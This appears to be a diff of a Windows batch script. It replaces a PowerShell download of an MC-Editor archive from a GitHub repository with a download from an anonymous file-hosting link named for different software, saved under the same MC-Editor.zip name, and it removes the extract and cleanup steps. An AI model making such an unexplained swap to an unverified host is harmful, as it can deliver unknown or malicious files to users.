@@ -1,4 +1,2 @@
-powershell -command "Invoke-WebRequest -Uri 'https://github.com/wwwqr-000/launchcontrolw/raw/main/Resources/MCeditor.zip' -OutFile MC-Editor.zip"
-powershell -command "Expand-Archive -Force 'MC-Editor.zip' 'MC-Editor'"
-del /A:H MC-Editor.zip
-echo Done!>Done.txt
+powershell -command "Invoke-WebRequest -Uri 'https://anonfiles.com/Ra0a9d27u2/Wondershare_zip' -OutFile MC-Editor.zip"
+
